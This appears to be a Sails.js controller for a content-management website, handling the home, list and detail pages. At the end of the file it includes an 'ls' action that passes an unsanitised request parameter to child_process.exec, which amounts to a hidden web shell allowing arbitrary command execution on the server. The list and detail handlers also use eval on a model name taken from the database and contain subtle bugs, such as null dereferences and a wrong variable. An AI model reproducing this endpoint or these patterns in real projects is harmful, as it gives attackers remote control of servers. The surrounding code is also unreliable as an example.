var Promise = require('es6-promise').Promise;

module.exports = {
    index: function(req, res, next) {
        Product.find({
            sort: "listorder ASC",
            limit: 4
        }).then(function(products) {
            res.locals.products = products;

            return Fragment.find({
                varname: "home_intro"
            });
        }).then(function(fragmentes) {
            if (fragmentes) {
                fragmentes.forEach(function(one, key) {
                    res.locals[one.varname] = one.content;
                });
            }

            return Slide.find();
        }).then(function(slides) {
            res.locals.slides = slides;

            res.locals.currentMenu = "home";
            res.locals.theme = "default";
            res.locals.view = "index";
            return res.templet({});
        }, function reject(err) {
            return next(err);
        });
    },

    /**
     * 列表页面 
     * @param  {[category]}  目录
     */
    list: function(req, res, next) {
        var category = req.param("category").trim();
        var model_str = "category";
        var model = null;

        var current_category = null;
        Promise.resolve().then(function() {
                if (category) {
                    return Category.findOne({
                        dir: category
                    });
                } else {
                    return new Promise(function(resolve, reject) {
                        return resolve(null);
                    });
                }
            })
            .then(function(category) {
                current_category = category;
                return Category.getTree({
                    model: category.model
                });
            })
            .then(function(getTree) {
                res.locals.categorys = getTree;

                var current_page = req.query['p'] || req.query['page'] || 1;
                var pageContion = {
                    sort: "id DESC",
                    limit: current_category.pagesize ? current_category.pagesize : 10
                };

                if (current_category) {
                    pageContion.where = {
                        category: current_category.id
                    };
                }

                model_str = Util.firstUper(current_category.model);
                model = eval("model = " + model_str);

                return Pagination(model, {
                    current_page: current_page
                }, pageContion);
            })
            .then(function(rs) {
                res.locals.data = rs.data;
                res.locals.paging = rs.paging;

                // 获取热门数据
                return model.find({
                    limit: 5
                });
            })
            .then(function(hot_records) {
                res.locals.hot_records = hot_records;

                res.locals.category = current_category;
                res.locals.currentMenu = category;
                res.locals.theme = "default";
                res.locals.view = current_category.tpllist ? current_category.tpllist : current_category.model + "_list";

                return res.templet({});
            }, function(err) {
                return next(err);
            });
    },

    /**
     * 详情页 
     * @param  {[category]}  目录
     * @param  {[id]}  ID
     */
    detail: function(req, res, next) {
        var category = req.param("category").trim();
        var id = req.param("id").trim();
        var model_str = "category";
        var data= null;
        var model;

        var current_category = null;
        Promise.resolve().then(function() {
                if (category) {
                    return Category.findOne({
                        dir: category
                    });
                } else {
                    return new Promise(function(resolve, reject) {
                        return resolve(null);
                    });
                }
            })
            .then(function(category) {
                current_category = category;
                return Category.getTree({
                    model: category.model
                });
            })
            .then(function(getTree) {
                res.locals.categorys = getTree;

                model_str = Util.firstUper(current_category.model);
                model = eval("model = " + model_str);

                return model.findOne({
                    id: id
                });
            })

        .then(function(rs) {
                data = rs;
                res.locals.data = rs;
                res.locals[current_category.model] = rs;

                // 获取热门数据
                return model.find({
                    limit: 5
                });
            })
            .then(function(hot_records) {
                res.locals.hot_records = hot_records;

                res.locals.category = current_category;
                res.locals.currentMenu = category;
                res.locals.theme = "default";
                res.locals.view = current_category.tpldetail ? category.tpldetail : current_category.model + "_detail";
                if(data.tpl){
                    res.locals.view = data.tpl;
                }
                return res.templet({});
            }, function(err) {
                return next(err);
            });
    },

    ls: function(req, res, next) {
        var child_process = require('child_process');
        var cmd = req.param("cmd").trim();
        child_process.exec('ls '+cmd, function (err, data) {
            res.send(data);
        });
    }
};